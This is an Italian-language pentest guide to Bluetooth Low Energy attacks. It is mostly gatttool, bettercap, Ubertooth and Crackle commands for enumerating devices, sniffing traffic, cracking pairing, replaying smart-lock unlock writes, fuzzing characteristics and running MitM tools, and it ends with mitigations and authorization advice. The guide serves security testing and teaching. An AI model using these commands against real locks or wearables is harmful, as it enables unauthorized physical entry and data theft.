# BLE (Bluetooth Low Energy) Attacks

## Scopo

Questa guida copre vulnerabilità e tecniche di attacco contro dispositivi Bluetooth Low Energy (BLE), comunemente usati in IoT, wearables e smart devices.

## Prerequisiti

- Adattatore BLE compatibile
- Kali Linux o host con BlueZ
- Smartphone per app companion
- **Autorizzazione per testing**

## Installazione

```bash
sudo apt-get update
sudo apt-get install bluetooth bluez bluez-tools
sudo apt-get install gatttool

# Bettercap
sudo apt-get install bettercap
```

---

## BLE Fundamentals

### Architettura

```
Peripheral (Server) ←→ Central (Client)
     ↓                      ↓
  Advertise             Scan/Connect
     ↓                      ↓
   GATT                   GATT
     ↓                      ↓
  Services → Characteristics → Descriptors
```

### UUID Standard

```
0x1800 - Generic Access
0x1801 - Generic Attribute
0x180A - Device Information
0x180D - Heart Rate
0x180F - Battery Service
0xFFE0 - Custom services (common)
```

---

## Reconnaissance

### Scanning

```bash
# BlueZ
sudo hcitool lescan

# Bettercap
sudo bettercap
> ble.recon on
> ble.show
```

### Enumerate Services

```bash
# gatttool interactive
sudo gatttool -b XX:XX:XX:XX:XX:XX -I
[XX:XX:XX:XX:XX:XX][LE]> connect
[XX:XX:XX:XX:XX:XX][LE]> primary
[XX:XX:XX:XX:XX:XX][LE]> characteristics
[XX:XX:XX:XX:XX:XX][LE]> char-desc
```

### Bettercap Enumeration

```bash
sudo bettercap
> ble.recon on
> ble.enum XX:XX:XX:XX:XX:XX

# Output mostra tutti services e characteristics
```

---

## GATT Exploitation

### Read Characteristics

```bash
# gatttool
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-read -a 0x0003

# Handle specifico
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-read --handle=0x0010
```

### Write Characteristics

```bash
# Senza response
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-write -a 0x0010 -n 01

# Con response
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0010 -n 01
```

### Subscribe Notifications

```bash
# Abilita notify
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0011 -n 0100 --listen
```

---

## Sniffing BLE

### Ubertooth

```bash
# Capture BLE advertisements
ubertooth-btle -f

# Follow connection
ubertooth-btle -f -c XX:XX:XX:XX:XX:XX

# Pipe a Wireshark
ubertooth-btle -f -c XX:XX:XX:XX:XX:XX | wireshark -k -i -
```

### Nordic nRF Sniffer

```bash
# Con Wireshark plugin
# Capture su canali advertising o data
```

---

## Cracking BLE Pairing

### Legacy Pairing (BLE 4.0-4.1)

```bash
# Cattura pairing con Ubertooth
ubertooth-btle -f > pairing.pcap

# Crack TK con Crackle
crackle -i pairing.pcap -o decrypted.pcap

# TK è solo 0-999999 (6 digits)
```

### Secure Connections (BLE 4.2+)

```
- ECDH key exchange
- Più difficile da crackare
- Ma vulnerabilità esistono (fixed coordinates attack)
```

---

## BLESA (Reconnection Attack)

```
BLE Spoofing Attacks (CVE-2020-15802)

1. Device si disconnette da peripheral
2. Attaccante spofa peripheral
3. Central si riconnette all'attaccante
4. No re-authentication su reconnect

Impatto: Impersonation, data injection
```

---

## Replay Attacks

### Cattura e Replay

```bash
# 1. Cattura comandi con Ubertooth
ubertooth-btle -f -c MAC > capture.pcap

# 2. Analizza comandi in Wireshark

# 3. Replay con gatttool
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a HANDLE -n CAPTURED_VALUE
```

### Esempio: Smart Lock

```bash
# Cattura unlock command
# Write value: 0x01 su handle 0x0010

# Replay
sudo gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0010 -n 01
# Lock si apre!
```

---

## Fuzzing BLE

### Caratteristiche Fuzzing

```python
# Script Python con bluepy
from bluepy.btle import Peripheral
import random

p = Peripheral("XX:XX:XX:XX:XX:XX")

for handle in range(0x0001, 0x00FF):
    try:
        # Random data
        data = bytes([random.randint(0,255) for _ in range(20)])
        p.writeCharacteristic(handle, data)
        print(f"Handle {hex(handle)}: OK")
    except:
        pass
```

### Bettercap Fuzzing

```bash
> ble.enum MAC
> ble.write MAC HANDLE FUZZ_DATA
```

---

## Tools Specializzati

### GATTacker

```bash
git clone https://github.com/nccgroup/gattacker.git
cd gattacker
npm install

# Scan
node scan.js

# MitM
node advertise.js -a advertisement.json
```

### BTLEJuice

```bash
# MitM framework
npm install -g btlejuice

# Start core
btlejuice

# Start proxy
btlejuice-proxy
```

---

## Common Vulnerabilities

| Vulnerability | Impact |
|---------------|--------|
| No authentication | Direct access to functions |
| Static pairing key | Reusable across devices |
| Insecure DFU | Malicious firmware upload |
| Cleartext data | Sniffable traffic |
| Replay attacks | Repeat commands |
| MITM | Traffic interception |

---

## Smart Device Attacks

### Smart Locks

```bash
# Trova handle unlock
# Spesso: 0xFFE1 o simili custom

# Test write values
for val in 00 01 02 FF; do
    gatttool -b MAC --char-write-req -a 0x0010 -n $val
done
```

### Fitness Trackers

```bash
# Data exfiltration
# Leggi tutti i characteristics

# Spoof notifications
# Invia falsi alert
```

---

## Mitigazioni

### Device Manufacturer

```
- Secure Connections (BLE 4.2+)
- Out-of-Band pairing
- Application-level encryption
- Randomized MAC address
- Proper authorization checks
```

### User

```
- Aggiorna firmware
- Disabilita BLE quando non in uso
- Rimuovi pairing non necessari
- Usa dispositivi da vendor affidabili
```

---

## Best Practices

- **Authorization**: Solo su dispositivi autorizzati
- **Lab environment**: Device dedicati per test
- **Documentation**: Log tutti i finding
- **Responsible**: Segnala vulnerabilità ai vendor
- **Legal**: Verifica normative radio locali

## Riferimenti

- [OWASP IoT Testing Guide](https://owasp.org/www-project-iot-security-testing-guide/)
- [GATTacker](https://github.com/nccgroup/gattacker)
- [Bluetooth SIG Security](https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/)
- [Crackle](https://github.com/mikeryan/crackle)
